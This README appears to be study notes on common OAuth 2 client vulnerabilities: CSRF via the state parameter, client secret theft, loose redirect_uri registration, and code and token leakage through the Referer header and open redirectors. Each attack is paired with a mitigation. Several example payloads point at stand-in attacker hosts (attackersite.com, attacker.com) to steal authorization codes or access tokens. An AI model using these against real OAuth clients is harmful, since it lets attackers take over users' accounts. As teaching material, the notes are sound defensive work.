[index](https://github.com/KiraDiShira/OAuth2/blob/master/README.md#oauth2)

# Common client vulnerabilities

- [CSRF attack against the client](#csrf-attack-against-the-client)
- [Theft of client credentials](#theft-of-client-credentials)
- [Registration of the redirect URI](#registration-of-the-redirect-uri)
  - [Stealing the authorization code through the referrer](#stealing-the-authorization-code-through-the-referrer)
  - [Stealing the token through an open redirector](#stealing-the-token-through-an-open-redirector)
- [Theft of authorization codes](#theft-of-authorization-codes)
- [Theft of tokens](#theft-of-tokens)

## CSRF attack against the client

Both the authorization code and the implicit grant types mention a recommended state parameter. This parameter is:

```
An opaque value used by the client to maintain state between the request and callback. The authorization server includes this value when redirecting the user-agent back to the client. The parameter SHOULD be used for preventing cross-site request forgery (CSRF).
```

CSRF occurs when a malicious application causes the user’s browser to perform an unwanted action through a request to a web site where the user is currently authenticated.

How is that possible? The main thing to keep in mind is that browsers make requests (with cookies) to any origin, allowing specific actions to be performed when requested. If a user is logged in to one site that offers the capability to execute some sort of task and an attacker tricks the user’s browser into making a request to one of these task URIs, then the task is performed as the logged-in user. Typically, an attacker will embed malicious HTML or JavaScript code into an email or website to request a specific task URI that executes without the user’s knowledge.

The most common and effective mitigation is to add an unpredictable element in each HTTP request, which is the countermeasure taken by the OAuth specification. Let’s see why the use of the state parameter is highly encouraged to avoid CSRF and how to produce a proper state parameter to be safely used.

Let’s assume there is an OAuth client that supports the authorization code grant type. When the OAuth client receives a code parameter on its OAuth callback endpoint, it then will trade the received code for an access token. Eventually, the access token is passed to the resource server when the client calls an API on behalf of the resource owner. To perform the attack, the attacker can simply start an OAuth flow and get an authorization code from the target authorization server, stopping his “OAuth dance” here. The attacker causes the victim’s client to “consume” the attacker’s authorization code. The latter is achieved by creating a malicious page in his website, something like:

```
<img src="https://ouauthclient.com/callback?code=ATTACKER_AUTHORIZATION_CODE">
```

and convince the victim to visit it.

This would have the net effect of the resource owner having his client application connected with the attacker’s authorization context. This has disastrous consequences when the OAuth protocol is used for authentication, which is further discussed in chapter 13.

The mitigation for an OAuth client is to generate an unguessable state parameter and pass it along to the first call to the authorization server. The authorization server is required by the specification to return this value as-is as one of the parameters to the redirect URI. Then when the redirect URI is called, the client checks the value of the state parameter. If it is absent or if it doesn’t match the value originally passed, the client can terminate the flow with an error. This prevents an attacker from using their own authorization code and injecting it into an unsuspecting victim’s client. 

One natural question that can easily arise is what this state parameter should look like. The specification doesn’t help too much because it’s pretty vague:

```
The probability of an attacker guessing generated tokens (and other credentials not intended for handling by end-users) MUST be less than or equal to 2 -128 and SHOULD be less than or equal to 2 -160.
```

The generated state value can then be stored either in the cookie or, more appropriately, in the session and used subsequently to perform the check as explained earlier.

Although the use of state isn’t explicitly enforced by the specification, it is considered best practice and its presence is needed to defend against CSRF.

https://auth0.com/blog/ten-things-you-should-know-about-tokens-and-cookies/

## Theft of client credentials

The OAuth core specification specifies four different grant types. Each grant type is designed with different security and deployment aspects in mind and should be used accordingly, as discussed in chapter 6. For example, the implicit grant flow is to be used by OAuth clients where the client code executes within the user agent environment. Such clients are generally JavaScript-only applications, which have, of course, limited capability of hiding the client_secret in client side code running in the browser. On the other side of the fence there are classic server-side applications that can use the authorization code grant type and can safely store the client_secret somewhere in the server.

What about native applications? We have already seen in chapter 6 when to use which grant type, and as a reminder it isn’t recommended that native applications use the implicit flow. It is important to understand that for a native application, even if the client_secret is somehow hidden in the compiled code it must not be considered as a secret. Even the most arcane artifact can be decompiled and the client_secret is then no longer that secret. The same principle applies to mobile clients and desktop native applications.

In chapter 12 we’re going to discuss in detail how to use dynamic client registration to configure the client_secret at runtime.

Client_id and client_secret parts are empty.

```js
var client = {
  'client_name': 'Native OAuth Client',
  'client_id': '',
  'client_secret': '',
  'redirect_uris': ['com.oauthinaction.mynativeapp:/'],
  'scope': 'foo bar'
};
```

This information will be available at runtime after the dynamic registration phase is concluded. Now locate the authorization server information and add the registrationEndpoint.

```js
var authServer = {
  authorizationEndpoint: 'http://localhost:9001/authorize',
  tokenEndpoint: 'http://localhost:9001/token',
  registrationEndpoint: 'http://localhost:9001/register'
};
```

Finally, we need to plug the dynamic registration request when the application first requests an OAuth token, if it doesn’t already have a client ID.

```js
if (!client.client_id) {
  $.ajax({
       url: authServer.registrationEndpoint,
       type: 'POST',
       data: client,
       crossDomain: true,
       dataType: 'json'
   }).done(function(data) {
        client.client_id = data.client_id;
        client.client_secret = data.client_secret;
   }).fail(function() {
        $('.oauth-protected-resource').text('Error while fetching registration endpoint');
});
```
We’re now ready to run our modified native application If you start the usual OAuth flow, you can now appreciate that both the client_id and client_secret have been freshly generated, and these will be different for any instance of the native application. This will solve the issue of having the client_secret shipped with the native application artifact. A production instance of such a native application would, of course, store this information so that each installation of the client software will register itself once on startup, but not every time the user launches it. No two instances of the client application will have access to each other’s credentials, and the authorization server can differentiate between instances.

## Registration of the redirect URI

If you’re not careful with `redirect_uri` registration requirements, token hijacking attacks become significantly easier than you might think.

The main reason behind this is that sometimes authorization servers use different redirect_uri validation policies. As we’ll see in chapter 9, the only reliably safe validation method the authorization server should adopt is exact matching. All the other potential solutions, based on regular expressions or allowing subdirectories of the registered redirect_uri, are suboptimal and sometimes even dangerous.

<img src="https://github.com/KiraDiShira/OAuth2/blob/master/CommonClientVulnerabilities/Image/ccv_1.PNG" />

As seen in table 7.1, when the OAuth provider uses the allowing subdirectory method for matching the redirect_uri, there is certain flexibility on the redirect_uri request parameter.

Now it isn’t necessarily true that having an authorization server that uses the allowing subdirectory validation strategy is bad, on its own. But when combined with an OAuth client registering a “too loose” redirect_uri, this is indeed lethal. In addition, the larger the OAuth client’s internet exposure, the easier it is to find a loophole to exploit this vulnerability.

### Stealing the authorization code through the referrer

The first attack described targets the `authorization code` grant type and is based on information leakage through the HTTP referrer. At the end of it, the attacker manages to hijack the resource owner’s authorization code.

The HTTP referrer is an HTTP header field that browsers (and HTTP clients in general) attach when surfing from one page to another. In this way, the new web page can see where the request came from, such as an incoming link from a remote site.

Let’s assume you just registered an OAuth client to one OAuth provider that has an authorization server that uses the allowing subdirectory validation strategy for redirect_uri. Your OAuth callback endpoint is

```
https://yourouauthclient.com/oauth/oauthprovider/callback
```

But you registered as

```
https://yourouauthclient.com/
```

An excerpt of the request originated by your OAuth client while performing the OAuth integration might look like

```
https://oauthprovider.com/authorize?response_type=code&client_id=CLIENT_ID&scope=SCOPES&state=STATE&redirect_uri=https://yourouauthclient.com/
```

This particular OAuth provider adopts the allowing subdirectory validation strategy for redirect_uri, and therefore validates only the start of the URI and considers the request as valid if everything else is appended after the registered redirect_uri. Hence the registered redirect_uri is perfectly valid under a functional point of view, and things are good so far.

The attacker also needs to be able to create a page on the target site underneath the registered redirect URI, for example:

```
https://yourouauthclient.com/usergeneratedcontent/attackerpage.html
```

From here, it’s enough for the attacker to craft a special URI of this form:

```
https://oauthprovider.com/authorize?response_type=code&client_id=CLIENT_ID&scope=SCOPES&state=STATE&redirect_uri=https://yourouauthclient.com/usergeneratedcontent/attackerpage.html
```

and make the victim click on it, through any number of phishing techniques.

Since you registered `https://yourouauthclient.com` as redirect_uri and the OAuth provider adopts an allowing subdirectory validation strategy, `https://yourouauthclient.com/usergeneratedcontent/attackerpage.html` is a perfectly valid redirect_uri for your client.

That said, now that this is enough to “convince” the victim to click the crafted link and go through the authorization endpoint, the victim then will end up with something like

```
https://yourouauthclient.com/usergeneratedcontent/attackerpage.html?code=e8e0dc1c-2258-6cca-72f3-7dbe0ca97a0b
```

Let’s have a closer look at the code of `attackerpage.html`:

```
<html>
  <h1>Authorization in progress </h1>
  <img src="https://attackersite.com/">
</html>
```

In the background, the victim’s browser will load the embedded img tag for a resource at the attacker’s server. In that call, the HTTP Referer header will leak the authorization code.

<img src="https://github.com/KiraDiShira/OAuth2/blob/master/CommonClientVulnerabilities/Image/ccv_3.PNG" />

**Where is my Referrer?**
The URI in the attacker’s post must be an https URI. Indeed, as per section 15.1.3 (Encoding Sensitive Information in URI’s) of HTTP RFC [RFC 2616]: Clients SHOULD NOT include a Referer header field in a (non-secure) HTTP request if the referring page was transferred with a secure protocol.

<img src="https://github.com/KiraDiShira/OAuth2/blob/master/CommonClientVulnerabilities/Image/ccv_2.PNG" />

### Stealing the token through an open redirector

Another attack occurs along the lines discussed in the previous section, but this one is based on the `implicit grant type`.

This attack also targets the access token rather than the authorization code. To understand this attack, you need to understand how the URI fragment (the part after the #) is handled by browsers on HTTP redirect responses (HTTP 301/302 responses).

If an HTTP request `/bar#foo` has a 302 response with Location `/qux`, is the `#foo` part appended to the new URI (namely, the new request is `/qux#foo`) or not (namely, the new request is `/qux`)? 

What the majority of browsers do at the moment is to preserve the original fragment on redirect: that is, the new request is on the form `/qux#foo`. Also remember that fragments are never sent to the server, as they’re intended to be used inside the browser itself.

The attack here is similar to the previous one and all the premises we have established there remain: “too open” registered redirect_uri and authorization server that uses an allowing subdirectory validation strategy. As the leakage here happens through an open redirect rather than using the referrer, you also need to assume that the OAuth client’s domain has an open redirect, for example: `https://yourouauthclient.com/redirector?goto=http://targetwebsite.com`. As previously mentioned, there are fair chances that this kind of entry point exists on a website (even in the OAuth context).

The attacker can craft a URI like this:

```
https://oauthprovider.com/authorize?response_type=token&client_id=CLIENTID&scope=SCOPES&state=STATE&redirect_uri=https://yourouauthclient.com/
redirector?goto=https://attacker.com
```

If the resource owner has already authorized the application using TOFU, or if they can be convinced to authorize the application again, the resource owner’s user agent is redirected to the passed-in redirect_uri with the access_token appended in the URI fragment:

```
https://yourouauthclient.com/redirector?goto=https://attacker.com#accesstoken=2YotnFZFEjr1zCsicMWpAA
```

At this point, the open redirect in the client application forwards the user agent to the attacker’s website. Since URI fragments survive redirects in most browsers, the final landing page will be:

```
https://attacker.com#access_token=2YotnFZFEjr1zCsicMWpAA
```

Now it’s trivial for the attacker to steal the access token.

Both the attacks discussed above can be mitigated by the same simple practice. By registering the most specific redirect_uri possible, that would correspond to `https://yourouauthclient.com/oauth/oauthprovider/callback` in our example, the client can avoid having the attacker take over control of its OAuth domain. Obviously, you need to design your client application to avoid letting an attacker create a page under `https://yourouauthclient.com/oauth/oauthprovider/callback` as well; otherwise, you’re back to square one. However, the more specific and direct the registration is, the less likely it is for there to be a matching URI under the control of a malicious party.

## Theft of authorization codes

If the attacker hijacked the authorization code, can they “steal” anything, such as the resource owner’s personal information as email, contact information, and so on? Not quite yet. 

Remember that the authorization code is still an intermediate step between the OAuth client and the access token, which is the final goal of the attacker. To trade the authorization code for an access token, the `client_secret` is needed, and this is something that must be closely protected. But if the client is a public client, it will have no client secret and therefore the authorization code can be used by anyone. With a confidential client, an attacker can either try to maliciously obtain the client secret, as
seen in section [CSRF attack against the client](#csrf-attack-against-the-client), or attempt to trick the OAuth client into performing a sort of CSRF similar to the one we have seen in section 7.1. We’re going to describe the latter case in chapter 9 and view its effects there.

## Theft of tokens

The ultimate goal for an attacker that focuses their attention on an OAuth aware target is to steal an access token.

We already saw how OAuth clients send access tokens to resource servers to consume APIs. This is usually done by passing the bearer token as a request header (Authorization: Bearer access_token_value). 

RFC 6750 defines two other ways to pass the bearer token along. One of those, the URI queryparameter,14 states that clients can send the access token in the URI using the `access_token` query parameter. Although the simplicity makes its use tempting, there are many drawbacks:

- The access token ends up being logged in `access.log` files as part of the URI.

- People tend to be indiscriminate in what they copy and paste in a public forum when searching for answers (for example, Stackoverflow). This might well end up having the access token being pasted in one of these forums through HTTP transcripts or access URLs. 

- There is a risk of access token leakage through the referrer similar to the one we have seen in the previous section, because the referrer includes the entire URL. 

Let’s assume there is an OAuth client that sends the access token in the URI to the resource server, using something like the following:

```
https://oauthapi.com/data/feed/api/user.html?access_token=2YotnFZFEjr1zCsicMWp
```

If an attacker is able to place even a simple link to this target page (data/feed/api/user.html) then the Referer header will disclose the access token.

## Native applications best practices

Historically, one of the weaknesses of OAuth was a poor end-user experience on mobile devices. 

To help smooth the user experience, it was common for native OAuth clients to leverage a `web-view` component when sending the user to the authorization server’s authorization endpoint (interacting with the front channel). A `web-view` is a system component that allows applications to display web content within the UI of an application. The `web-view` acts as an embedded useragent, separate from the system browser. 

Unfortunately, the web-view has a long history of security vulnerabilities and concerns that come with it. Most notably, the client applications can inspect the contents of the web-view component, and would therefore be able to eavesdrop on the end-user credentials when they authenticated to the authorization server. 

Since a major focus of OAuth is keeping the user’s credentials out of the hands of the client applications entirely, this is counterproductive. The usability of the web-view component is far from ideal. Because it’s embedded inside the application itself, the web-view doesn’t have access to the system browser’s cookies, memory, or session information. Accordingly, the web-view doesn’t have access to any existing authentication sessions, forcing users to sign in multiple times.

Native OAuth clients can make HTTP requests exclusively through external useragents such as the system browser (as we have done in the native application we built in chapter 6). A great advantage of using a system browser is that the resource owner is able to see the URI address bar, which acts as a great anti-phishing defense. It also helps train users to put their credentials only into trusted websites and not into any application that asks for them.

In recent mobile operating systems, a third option has been added that combines the best of both of these approaches. In this mode, a special web-view style component is made available to the application developer. This component can be embedded within the application as in a traditional web-view. However, this new component shares the same security model as the system browser itself, allowing single-sign-on user experiences. Furthermore, it isn’t able to be inspected by the host application, leading to greater security separation on par with using an external system browser. 

In order to capture this and other security and usability issues that are unique to native applications, the OAuth working group is working on a new document called “OAuth 2.0 for Native Apps.”18 Other recommendations listed in the document include the following:

- For custom redirect URI schemes, pick a scheme that is globally unique and which you can assert ownership over. One way of doing this is to use reversed DNS notation, as we have done in our example application: `com.oauthinaction.mynativeapp:/`. This approach is a good way to avoid clashing with schemes used by other applications that could lead to a potential authorization code interception attack.

- In order to mitigate some of the risk associated with authorization code interception attack, it’s a good idea to use Proof Key for Code Exchange (PKCE). We’ll discuss PKCE in detail in chapter 10.

These simple considerations can substantially improve the security and usability of native applications that use OAuth.
